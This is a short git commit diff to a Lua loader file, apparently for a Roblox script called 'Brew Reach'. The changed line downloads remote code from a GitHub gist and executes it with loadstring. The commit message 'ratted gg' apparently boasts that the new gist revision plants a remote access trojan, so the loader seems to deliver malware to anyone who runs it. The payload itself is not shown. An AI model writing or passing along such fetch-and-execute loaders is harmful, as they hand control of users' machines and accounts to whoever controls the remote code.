4c528ad064d0d7f0ca9a8a26d7a9909b9ea8d497
dex <121840104+dex4tw@users.noreply.github.com>
2025-11-07 19:25:30 -0500

    ratted gg

--- loader.lua
+++ loader.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://gist.githubusercontent.com/dex4tw/6642fdf5d0199104e308c5f392557f75/raw/982baa05e9625715c22b88eedb8172c98103dcc3/Brew%2520Reach.lua"))()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/dex4tw/6642fdf5d0199104e308c5f392557f75/raw/babe1b547716ae2db45fc8d23dfe08a3b16da698/Brew%2520Reach.lua"))()
